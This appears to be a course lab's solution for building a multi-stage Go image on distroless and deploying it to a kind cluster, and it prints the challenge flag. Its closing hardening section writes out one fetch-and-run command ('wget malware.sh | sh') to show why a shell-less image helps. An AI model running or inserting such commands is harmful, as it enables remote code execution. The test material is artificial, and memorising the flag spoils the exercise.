# Solution: Multi-Stage Go Build

## Step 1 — Get the source files

```bash
mkdir -p /tmp/dojo-go-app
kubectl get configmap go-app-source -n dojo-docker-multistage \
  -o jsonpath='{.data.main\.go}' > /tmp/dojo-go-app/main.go
kubectl get configmap go-app-source -n dojo-docker-multistage \
  -o jsonpath='{.data.go\.mod}' > /tmp/dojo-go-app/go.mod
```

## Step 2 — Write the multi-stage Dockerfile

```bash
cat > /tmp/dojo-go-app/Dockerfile << 'EOF'
# ── Stage 1: Build ──────────────────────────────────────────────
FROM golang:1.23-alpine AS build
WORKDIR /src

# Download dependencies first (cached layer — only rebuilds when go.mod changes)
COPY go.mod ./
RUN go mod download

# Build the binary — CGO_ENABLED=0 produces a statically linked binary
# that doesn't need glibc at runtime
COPY . .
RUN CGO_ENABLED=0 GOOS=linux go build -o /app ./...

# ── Stage 2: Runtime ─────────────────────────────────────────────
# distroless/static contains: your binary + CA certs + timezone data
# No shell. No package manager. Nothing else.
FROM gcr.io/distroless/static-debian12:nonroot
COPY --from=build /app /app
EXPOSE 8080
ENTRYPOINT ["/app"]
EOF
```

## Step 3 — Build the image

```bash
docker build -t dojo/go-app-slim:1.0 /tmp/dojo-go-app/

# Verify the size
docker images dojo/go-app-slim:1.0
# Should be around 7-15 MB, not 400 MB
```

## Step 4 — Load into kind and deploy

```bash
# Load into the kind cluster (kind has its own image store separate from host Docker)
kind load docker-image dojo/go-app-slim:1.0 --name dojo

# Create the deployment
kubectl apply -f - << 'YAML'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: go-app-slim
  namespace: dojo-docker-multistage
  labels:
    app: go-app-slim
spec:
  replicas: 1
  selector:
    matchLabels:
      app: go-app-slim
  template:
    metadata:
      labels:
        app: go-app-slim
    spec:
      containers:
        - name: app
          image: dojo/go-app-slim:1.0
          imagePullPolicy: IfNotPresent
          ports:
            - containerPort: 8080
YAML
```

## Step 5 — Annotate and verify

```bash
kubectl annotate deployment go-app-slim \
  dojo.docker/build-type=multi-stage \
  -n dojo-docker-multistage

bash courses/course-37-docker-internals/challenges/04-multi-stage-go/verify.sh
```

**Flag:** `KUBE{distroless_binary_no_shell}`

## Why CGO_ENABLED=0 Matters

By default, Go's standard library links against the host's C library (glibc) for DNS lookups and a few other syscalls. `CGO_ENABLED=0` tells Go to use pure Go implementations instead — the result is a **statically linked binary** that works in any Linux container regardless of what C library is available, including distroless which has no glibc at all.

## Why Distroless Instead of Alpine?

| Base | Size | Shell | Attack surface |
|------|------|-------|----------------|
| `golang:1.23-alpine` | ~270 MB | yes | Full Go toolchain |
| `alpine:3.20` | ~7 MB | yes (`/bin/sh`) | Package manager, shell |
| `gcr.io/distroless/static:nonroot` | ~2 MB | **no** | CA certs only |

No shell means an attacker who finds a way to execute code can't run `wget malware.sh \| sh`. They're stuck with only the syscalls your binary makes. Every byte you don't ship is a byte you don't have to defend.
